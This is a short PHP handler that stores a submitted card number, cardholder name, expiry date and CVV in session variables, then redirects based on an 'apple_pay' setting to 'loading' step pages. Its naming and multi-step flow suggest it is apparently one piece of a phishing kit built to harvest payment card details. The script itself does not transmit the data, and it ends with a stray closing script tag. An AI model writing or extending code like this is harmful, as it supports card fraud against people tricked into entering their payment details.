<?php
session_start();

$_SESSION["ccnum"] = $_POST["input_cc_num"];
$_SESSION["nomcc"] = $_POST["input_cc_name"];

$_SESSION["ccexp"] = $_POST["input_cc_exp"];
$_SESSION["cvv"] = $_POST["input_cc_cvv"];


include("../settings.php");
$apple_pay =  $apple_pay;


if($apple_pay == true){
    header("location: ../steps/loading.php");
}
else{
    header("location: ../steps/loading_finished.php");

}
?>
     

</script>